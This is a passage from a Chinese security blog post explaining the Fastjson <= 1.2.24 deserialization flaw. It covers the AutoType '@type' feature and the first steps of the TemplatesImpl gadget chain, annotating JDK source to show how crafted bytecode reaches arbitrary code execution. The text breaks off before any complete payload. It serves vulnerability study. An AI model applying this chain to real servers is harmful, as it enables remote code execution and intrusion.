<div class=inner><ul>
<li>
<a href=#%e5%a3%b0%e6%98%8e aria-label=声明>声明</a></li><li>
<a href=#fastjson-%e6%98%af%e4%bb%80%e4%b9%88 aria-label="Fastjson 是什么">Fastjson 是什么</a></li><li>
<a href=#%e4%b8%ba%e4%bb%80%e4%b9%88%e4%bc%9a%e5%bc%83%e7%94%a8-fastjson- aria-label="为什么会弃用 Fastjson ？">为什么会弃用 Fastjson ？</a></li><li>
<a href=#fastjson-%e6%bc%8f%e6%b4%9e%e4%ba%a7%e7%94%9f%e5%8e%9f%e5%9b%a0 aria-label="Fastjson 漏洞产生原因">Fastjson 漏洞产生原因</a></li><li>
<a href=#templatesimpl-%e7%9a%84%e5%88%a9%e7%94%a8%e9%93%be aria-label="TemplatesImpl 的利用链">TemplatesImpl 的利用链</a></li><li>
<a href=#%e6%b5%8b%e8%af%95 aria-label=测试>测试</a></li><li>
<a href=#%e6%b3%a8 aria-label=注>注</a></li><li>
<a href=#%e5%85%b6%e4%bb%96 aria-label=其他>其他</a>
</li></ul></div></details>
</div><div class=post-content><h2 id=声明>声明<a hidden class=anchor aria-hidden=true href=#声明>#</a></h2><p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。</p><h2 id=fastjson-是什么>Fastjson 是什么<a hidden class=anchor aria-hidden=true href=#fastjson-是什么>#</a></h2><blockquote>
<p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p></blockquote><blockquote>
<p>fastjson相对其他JSON库的特点是快。fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。</p></blockquote><p>以上摘自Fastjson GitHub 介绍。</p><p>但近年来随着 Fastjson 不断爆出漏洞，各大中小型公司都逐渐弃用 Fastjson ，甚至阿里自己开源的服务注册、配置管理平台 <strong>NACOS</strong> 在 1.3.0 版本之后都从 Fastjson 替换为了 Jackson (详见 <a href=https://github.com/alibaba/nacos/releases/tag/1.3.0>https://github.com/alibaba/nacos/releases/tag/1.3.0</a>) ，可见漏洞危害之大。</p><h2 id=为什么会弃用-fastjson->为什么会弃用 Fastjson ？<a hidden class=anchor aria-hidden=true href=#为什么会弃用-fastjson->#</a></h2><p>想要研究一个产品的漏洞其中有一条很好的途径就是去查询 CVE 编号，但是我在检索之后发现 Fastjson 只有 <strong>CVE-2017-18349</strong> 这一条，而 Jackson 竟然有高达 76 条。</p><p>这能否证明 Fastjson 比 Jackson 更安全呢？答案并不是，都是半斤八两，有些 Fastjson 里面出现的漏洞在 Jackson 里面也同样存在。</p><p>那为什么会有公司弃用 Fastjson 呢？</p><p>或许是 Jackson 有更完善且公开的漏洞管理机制，或许是国外的月亮比较圆，或许是随大流，也或许是 Fastjson 代码质量不过关（知乎上有很多回答批判 Fastjson 代码糟糕的），真实原因就不得而知了。</p><p>尽管近年来有公司不断弃用 Fastjson ，但还有很多公司在使用，并且已经开发上线的系统想要替换或者升级 Fastjson 还需要时间，因此我们很有必要学习一下 Fastjson 漏洞的产因。</p><h2 id=fastjson-漏洞产生原因>Fastjson 漏洞产生原因<a hidden class=anchor aria-hidden=true href=#fastjson-漏洞产生原因>#</a></h2><p>Fastjson 第一次被爆出有漏洞是官方在2017年3月15日主动披露的，详见 <a href=https://github.com/alibaba/fastjson/wiki/security_update_20170315>https://github.com/alibaba/fastjson/wiki/security_update_20170315</a> 。漏洞影响 1.2.24 以及之前的版本。我们今天来研究一下当 fastjson version &lt;= 1.2.24 时漏洞是如何产生的。</p><p>我们先在 pom.xml 中增加 fastjson 1.2.24 的依赖。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;dependency&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;groupId&gt;</span>com.alibaba<span style=color:#f92672>&lt;/groupId&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;artifactId&gt;</span>fastjson<span style=color:#f92672>&lt;/artifactId&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;version&gt;</span>1.2.24<span style=color:#f92672>&lt;/version&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/dependency&gt;</span>
</span></span></code></pre></div><p>下面先看一个最常见的序列化为JSON和反序列化为对象的过程。</p><p>首先定义一个常见的 Java 对象。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>User</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> String name<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> Integer age<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getName</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;call getName&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> name<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setName</span><span style=color:#f92672>(</span>String name<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;call setName&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>name</span> <span style=color:#f92672>=</span> name<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Integer <span style=color:#a6e22e>getAge</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;call getAge&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> age<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setAge</span><span style=color:#f92672>(</span>Integer age<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;call setAge&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>age</span> <span style=color:#f92672>=</span> age<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>toString</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;User{&#34;</span> <span style=color:#f92672>+</span>
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;name=&#39;&#34;</span> <span style=color:#f92672>+</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;\&#39;&#39;</span> <span style=color:#f92672>+</span>
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;, age=&#34;</span> <span style=color:#f92672>+</span> age <span style=color:#f92672>+</span>
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;}&#39;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>编写一个测试类</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> com.alibaba.fastjson.JSON<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Eval0</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        User user <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> User<span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        user<span style=color:#f92672>.</span><span style=color:#a6e22e>setName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;守法市民小杜&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        user<span style=color:#f92672>.</span><span style=color:#a6e22e>setAge</span><span style=color:#f92672>(</span>26<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        String jsonString <span style=color:#f92672>=</span> JSON<span style=color:#f92672>.</span><span style=color:#a6e22e>toJSONString</span><span style=color:#f92672>(</span>user<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;序列化后: &#34;</span> <span style=color:#f92672>+</span> jsonString<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;反序列化开始&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;反序列化: &#34;</span> <span style=color:#f92672>+</span> JSON<span style=color:#f92672>.</span><span style=color:#a6e22e>parseObject</span><span style=color:#f92672>(</span>jsonString<span style=color:#f92672>,</span> User<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;反序列化结束&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>代码很简单，运行后会输出：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>call setName
</span></span><span style=display:flex><span>call setAge
</span></span><span style=display:flex><span>call getAge
</span></span><span style=display:flex><span>call getName
</span></span><span style=display:flex><span>序列化后: <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;age&#34;</span>:26,<span style=color:#e6db74>&#34;name&#34;</span>:<span style=color:#e6db74>&#34;守法市民小杜&#34;</span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>反序列化开始
</span></span><span style=display:flex><span>call setAge
</span></span><span style=display:flex><span>call setName
</span></span><span style=display:flex><span>反序列化: User<span style=color:#f92672>{</span>name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;守法市民小杜&#39;</span>, age<span style=color:#f92672>=</span>26<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>反序列化结束
</span></span></code></pre></div><p>可以看到 Fastjson 在将JSON字符串反序列化为 Java 对象的时候调用了 set方法，看过《Java 反序列化漏洞原理》前两篇文章的同学可能会思考，我们能否构建一条利用链，让 Fastjson 在执行 set 方法的时候能够执行我们指定的命令。</p><p>我们先假设这个方式成立，但目前存在两个问题：</p><ol>
<li>如何让 Fastjson 将JSON字符串反序列化为我们指定的对象？</li><li>哪一个对象可以在 set 的时候执行我们指定的命令呢？</li></ol><p>第一个问题查看 Fastjson 文档后可以得到答案，当 JSON 字符串的第一个 <strong>key</strong> 为 <strong>@type</strong> 时，会将 JSON 字符串反序列化为 <strong>@type</strong> 对应 <strong>value</strong> 中指定的 Java 类，这就是 Fastjson 的 AutoType 功能。并且 Fastjson 在反序列化带有 <strong>@type</strong> 的 JSON 字符串时，如果没有指定Java对象的类型，还会调用其成员变量的 get 方法。</p><p>我们稍微改动一下测试类，在序列化为JSON时将类型也写进去，在反序列化时将类型去除：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> com.alibaba.fastjson.JSON<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.alibaba.fastjson.serializer.SerializerFeature<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Eval1</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        User user <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> User<span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        user<span style=color:#f92672>.</span><span style=color:#a6e22e>setName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;守法市民小杜&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        user<span style=color:#f92672>.</span><span style=color:#a6e22e>setAge</span><span style=color:#f92672>(</span>26<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        String jsonString <span style=color:#f92672>=</span> JSON<span style=color:#f92672>.</span><span style=color:#a6e22e>toJSONString</span><span style=color:#f92672>(</span>user<span style=color:#f92672>,</span> SerializerFeature<span style=color:#f92672>.</span><span style=color:#a6e22e>WriteClassName</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;序列化后: &#34;</span> <span style=color:#f92672>+</span> jsonString<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;反序列化开始&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;反序列化: &#34;</span> <span style=color:#f92672>+</span> JSON<span style=color:#f92672>.</span><span style=color:#a6e22e>parseObject</span><span style=color:#f92672>(</span>jsonString<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;反序列化结束&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>执行后会输出：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>call setName
</span></span><span style=display:flex><span>call setAge
</span></span><span style=display:flex><span>call getAge
</span></span><span style=display:flex><span>call getName
</span></span><span style=display:flex><span>序列化后: <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;cn.typesafe.jsv.fastjson.User&#34;</span>,<span style=color:#e6db74>&#34;age&#34;</span>:26,<span style=color:#e6db74>&#34;name&#34;</span>:<span style=color:#e6db74>&#34;守法市民小杜&#34;</span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>反序列化开始
</span></span><span style=display:flex><span>call setAge
</span></span><span style=display:flex><span>call setName
</span></span><span style=display:flex><span>call getAge
</span></span><span style=display:flex><span>call getName
</span></span><span style=display:flex><span>反序列化: <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;name&#34;</span>:<span style=color:#e6db74>&#34;守法市民小杜&#34;</span>,<span style=color:#e6db74>&#34;age&#34;</span>:26<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>反序列化结束
</span></span></code></pre></div><p>可以看到确实是调用了 Java 对象的 get 方法，所以如果 get 方法能够触发代码执行也是可以的。</p><h2 id=templatesimpl-的利用链>TemplatesImpl 的利用链<a hidden class=anchor aria-hidden=true href=#templatesimpl-的利用链>#</a></h2><p>扩大条件后，第二个问题研究安全的前辈也已经帮我们找到了一个合适的 Java 对象 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>。</p><p>它的成员变量如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>TemplatesImpl</span> <span style=color:#66d9ef>implements</span> Templates<span style=color:#f92672>,</span> Serializable <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>long</span> serialVersionUID <span style=color:#f92672>=</span> 673094361519270707L<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>static</span> String DESERIALIZE_TRANSLET <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;jdk.xml.enableTemplatesImplDeserialization&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 父抽象类的完整包名称
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> String ABSTRACT_TRANSLET
</span></span><span style=display:flex><span>        <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 不重要，只要不为空就行
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>private</span> String _name <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 存放字节数组的数组
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span> _bytecodes <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Class 数组
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>private</span> Class<span style=color:#f92672>[]</span> _class <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// translet 子类在 _class 中的下标
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>int</span> _transletIndex <span style=color:#f92672>=</span> <span style=color:#f92672>-</span>1<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 存放 class 的容器，可以忽略
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>private</span> Hashtable _auxClasses <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 此字段不能为 null，因为要让 Fastjson 调用 getOutputProperties 方法
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>private</span> Properties _outputProperties<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 其他成员变量可以忽略
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>我们首先就来看 <code>_outputProperties</code> 对应的 <code>getOutputProperties</code> 方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>synchronized</span> Properties <span style=color:#a6e22e>getOutputProperties</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> newTransformer<span style=color:#f92672>().</span><span style=color:#a6e22e>getOutputProperties</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>TransformerConfigurationException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>代码很简单，重要的是 <code>newTransformer()</code> 方法，代码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>synchronized</span> Transformer <span style=color:#a6e22e>newTransformer</span><span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> TransformerConfigurationException
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    TransformerImpl transformer<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    transformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TransformerImpl<span style=color:#f92672>(</span>getTransletInstance<span style=color:#f92672>(),</span> _outputProperties<span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>        _indentNumber<span style=color:#f92672>,</span> _tfactory<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_uriResolver <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        transformer<span style=color:#f92672>.</span><span style=color:#a6e22e>setURIResolver</span><span style=color:#f92672>(</span>_uriResolver<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_tfactory<span style=color:#f92672>.</span><span style=color:#a6e22e>getFeature</span><span style=color:#f92672>(</span>XMLConstants<span style=color:#f92672>.</span><span style=color:#a6e22e>FEATURE_SECURE_PROCESSING</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        transformer<span style=color:#f92672>.</span><span style=color:#a6e22e>setSecureProcessing</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> transformer<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>其中 <code>getTransletInstance()</code> 代码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> Translet <span style=color:#a6e22e>getTransletInstance</span><span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>throws</span> TransformerConfigurationException <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// _name 不能为 null，不然就直接返回了
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_name <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// _class 不能赋值，要进入 defineTransletClasses 才能将我们准备的 Class 加载进来
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_class <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> defineTransletClasses<span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 从加载成功的Class中找到 AbstractTranslet 的子类使用反射创建对象，newInstance() 会调用默认的无参构造方法，因此只要在构造方法中添加我们需要的代码就能做到任意代码执行
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        AbstractTranslet translet <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>AbstractTranslet<span style=color:#f92672>)</span> _class<span style=color:#f92672>[</span>_transletIndex<span style=color:#f92672>].</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 下面的代码不重要了
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        translet<span style=color:#f92672>.</span><span style=color:#a6e22e>postInitialization</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        translet<span style=color:#f92672>.</span><span style=color:#a6e22e>setTemplates</span><span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        translet<span style=color:#f92672>.</span><span style=color:#a6e22e>setServicesMechnism</span><span style=color:#f92672>(</span>_useServicesMechanism<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        translet<span style=color:#f92672>.</span><span style=color:#a6e22e>setAllowedProtocols</span><span style=color:#f92672>(</span>_accessExternalStylesheet<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_auxClasses <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            translet<span style=color:#f92672>.</span><span style=color:#a6e22e>setAuxiliaryClasses</span><span style=color:#f92672>(</span>_auxClasses<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> translet<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>InstantiationException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
